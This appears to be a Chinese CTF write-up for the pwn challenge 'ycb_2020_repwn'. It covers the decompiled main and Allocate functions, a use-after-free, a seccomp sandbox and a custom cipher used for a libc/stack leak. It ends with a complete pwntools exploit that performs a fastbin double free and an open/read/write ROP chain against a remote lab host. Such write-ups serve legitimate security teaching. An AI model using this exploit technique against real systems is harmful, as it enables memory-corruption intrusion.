# ycb_2020_repwn

函数主体流程:（存在UAF漏洞，并且存在沙盒保护，同时存在Re逆向的加解密；

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int choice; // [rsp+28h] [rbp-128h]
  size_t n; // [rsp+2Ch] [rbp-124h] BYREF
  int v5; // [rsp+34h] [rbp-11Ch]
  int v6; // [rsp+38h] [rbp-118h]
  int v7; // [rsp+3Ch] [rbp-114h]
  _BYTE buf[264]; // [rsp+40h] [rbp-110h] BYREF
  unsigned __int64 v9; // [rsp+148h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  Init();                                       // 初始化
  Prctl();                                      // 沙盒保护
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = ReadInt();
      if ( choice != 1 )
        break;
      Allocate();                               // 1. Allocate
    }
    if ( choice == 3 )
    {
      Free();                                   // 3. Free (UAF)
    }
    else
    {
      if ( choice != 2 )                        // 2. Re
        exit(0);
      if ( !bss_re_flag )                       // 仅可执行一次
      {
        Read(buf, 16);
        HIDWORD(n) = 51;
        v5 = 18;
        v6 = 120;
        v7 = 36;
        Re(buf, 16, (char *)&n + 4);            // 加密
        write(1, buf, 0x10u);
        bss_re_flag = 1;
      }
    }
  }
}
```

相当于在libc2.23之上的大杂烩；（难度不大，但是流程比较长，毕竟啥都有；

```c
__int64 Allocate()
{
  int v0; // ebx
  void **chunk; // rbx
  int size; // [rsp+Ch] [rbp-14h]

  printf("how long?");
  size = ReadInt();                             // 读入size大小
  if ( (unsigned int)bss_flag > 9 )             // 总共可申请10块大小
    exit(0);
  if ( size <= 0 || size > 104 )                // 限制申请范围大小
    exit(0);
  v0 = bss_flag;
  bss_ck[v0] = malloc(0x10u);
  chunk = (void **)(bss_ck[bss_flag] + 8LL);
  *chunk = malloc(size);
  read(0, *(void **)(bss_ck[bss_flag] + 8LL), (unsigned int)size);// 读入内容
  return (unsigned int)++bss_flag;
}
```

利用UAF在libc2.23上的fastbin的double free来造成有限制的任意地址写，往栈上返回地址写入ROP链（canary虽然开启，但是该题目中大部分函数并没有canary）；利用orw回显flag；

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

binary = './ycb_2020_repwn'
#r = process(binary)
r = remote('node4.buuoj.cn',29377)
elf = ELF(binary)
#libc = elf.libc
libc = ELF('./libc-2.23.so')

def Allocate(size,payload=b'/bin/sh\x00'):
    r.sendlineafter("your choice:",'1')
    r.sendlineafter("how long?",str(size))
    r.send(payload)

def Free(idx):
    r.sendlineafter("your choice:",'3')
    r.sendlineafter("which one?",str(idx))

def dec(res):
    v5 = [51,18,120,36]
    v9 = 9
    v7 = 0x26a77aaa
    while v9 > 0:
        v10 = (v7 >> 2) & 3
        for i in range(15,-1,-1):
            v6 = res[(i-1+16)%16]
            res[i] -= (((v6 >> 7) ^ 8 * res[(i + 1)%16]) + ((res[(i + 1)%16] >> 2) ^ 32 * v6) - 33) ^ ((res[(i + 1)%16] ^ v7 ^ 0x57)+ (v6 ^ v5[v10 ^ i & 3])+ 63)
            res[i] &= 0xff
        v7 -= 0x76129BDA
        v7 &= 0xffffffff
        v9 -= 1

r.sendlineafter("your choice:",'2')#leak
r.sendline()
rev = r.recv(0x10)
res = []
print(rev[0])
for i in range(len(rev)):
    res.append(rev[i])
dec(res)
addr = ''
for i in range(len(rev)):
    addr += chr(res[i])

libc_base  = u64(addr[:8].ljust(8,'\x00'))-0x5F1A88
stack_addr = u64(addr[8:].ljust(8,'\x00'))

Allocate(0x68)#0
Allocate(0x68)#1
Allocate(0x68)#2
Free(0)
Free(1)
Free(0)#double free
Allocate(0x68,p64(stack_addr-0xf3))

pop_rdi_ret = 0x0000000000021102 + libc_base
pop_rsi_ret = 0x00000000000202e8 + libc_base
pop_rdx_ret = 0x0000000000001b92 + libc_base
pop_rax_ret = 0x0000000000033544 + libc_base# 0x000000000003a718
pop_rsp_ret = 0x0000000000003838 + libc_base
open_addr  = libc.symbols['open']  + libc_base
read_addr  = libc.symbols['read']  + libc_base
write_addr = libc.symbols['write'] + libc_base
payload  = b'a'*3+p64(pop_rdx_ret)+p64(0x200)+p64(read_addr)+p64(pop_rsp_ret)+p64(stack_addr)
payload += flat([pop_rdi_ret,0,pop_rsi_ret,stack_addr,pop_rsp_ret,stack_addr-0xe0])

Allocate(0x68)#3
Allocate(0x68)#4
success("libc_base -> "+hex(libc_base))
success("stack_addr -> "+hex(stack_addr))
#gdb.attach(r)
Allocate(0x68,payload)#5

payload2  = flat([pop_rdi_ret,stack_addr+0xa8,pop_rsi_ret,4,pop_rdx_ret,4,open_addr])
payload2 += flat([pop_rdi_ret,3,pop_rsi_ret,stack_addr+0xb0,pop_rdx_ret,0x50,read_addr])
payload2 += flat([pop_rdi_ret,1,pop_rsi_ret,stack_addr+0xb0,pop_rdx_ret,0x50,write_addr])
payload2  = payload2.ljust(0xa0,b'b')+b'./flag\x00\x00\x00\x00' 
sleep(0.2)
r.sendline(payload2)

r.interactive()
```